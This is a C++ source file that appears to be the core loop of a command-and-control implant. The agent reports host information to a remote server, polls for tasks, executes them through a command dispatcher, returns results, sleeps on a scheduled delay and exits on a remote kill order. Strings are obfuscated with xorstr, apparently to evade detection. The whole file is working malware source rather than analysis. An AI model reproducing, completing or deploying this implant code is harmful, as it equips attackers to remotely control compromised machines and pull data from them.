// ========================================== { START OF FILE } ========================================== //
#include "agent/agent.h"

#include <chrono>
#include <cstdint>
#include <thread>

#include "agent/commands/command_dispatcher.h"
#include "agent/commands/exec/exit.h"
#include "agent/host/host_info.h"
#include "agent/runtime/schedule.h"
#include "agent/util/trace.h"
#include "xorstr/xorstr.hpp"

namespace agent {

    Agent::Agent(transport::CommManager comm_manager, task::TaskQueueManager task_queue_manager)
        : comm_manager(std::move(comm_manager)), task_queue_manager(std::move(task_queue_manager)) {}

    void Agent::Start() {
        AGENT_TRACE_STAGE("boot");
        comm_manager.InitialCheckin(host::GetHostInformation().ToJson());
        AGENT_TRACE_STAGE(xorstr_("checked_in"));

        std::uint32_t iteration = 0;
        while (true) {
            ++iteration;
            // Results are batched as a JSON array; an empty array is sent when there is nothing to report.
            const bool has_result = task_queue_manager.HasPendingResult();
            const std::string body = has_result ? task_queue_manager.GetTaskResult() : xorstr_("[]");
            AGENT_TRACE_LOG("loop", xorstr_(" iteration="), iteration, xorstr_(" result="), has_result,
                            xorstr_(" bytes="), body.size());

            const std::string response = comm_manager.Checkin(body);
            AGENT_TRACE_LOG(xorstr_("checkin"), xorstr_(" bytes="), response.size());

            // An empty response means the server had no queued task; do not enqueue an empty blob.
            if (!response.empty()) {
                task_queue_manager.QueueTask(response);
            }

            if (task_queue_manager.HasPendingTask()) {
                const models::CheckinResponse task = task_queue_manager.GetNextTask();
                if (task.id == 0) {
                    // Malformed task blob - drop it rather than reporting a bogus result.
                    AGENT_TRACE_LOG("task", xorstr_(" malformed"));
                    continue;
                }
                AGENT_TRACE_LOG("task", " id=", task.id, " type=", static_cast<int>(task.type),
                                " code=", static_cast<int>(task.code));
                // Report what the command actually did: a task only becomes SUCCESS when the
                // dispatcher says so, otherwise the server stores the diagnostic as an error and
                // the failure is visible instead of being buried in a successful task's output.
                const commands::CommandResult result = commands::CommandDispatcher::Dispatch(task);
                AGENT_TRACE_LOG("task", " id=", task.id, " ok=", result.success, xorstr_(" output="),
                                result.output.size());
                task_queue_manager.StoreTaskResult(task.id, task.type, task.code, result.success, result.output);

                // KILL: the exit task's own result has to reach the server, so deliver it with one final
                // check-in and only then end the process. Exiting inside the command would leave the task
                // queued forever - the failure mode this tree exists to prevent.
                if (commands::exec::AgentExitRequested()) {
                    const std::string final_body =
                        task_queue_manager.HasPendingResult() ? task_queue_manager.GetTaskResult() : xorstr_("[]");
                    AGENT_TRACE_STAGE(xorstr_("exiting"));
                    // The result is already stored; if this delivery fails there is nothing left to retry,
                    // so the response is deliberately dropped (the process ends either way).
                    (void)comm_manager.Checkin(final_body);
                    commands::exec::ExitAgentProcess();
                }
            }
            AGENT_TRACE_STAGE("sleep");
            const std::int64_t delay_ms = runtime::Schedule::Instance().NextDelayMs();
            AGENT_TRACE_LOG(xorstr_("sleep"), xorstr_(" ms="), delay_ms);
            std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms));
        }
    }

}  // namespace agent
// ========================================== { END OF FILE } ========================================== //
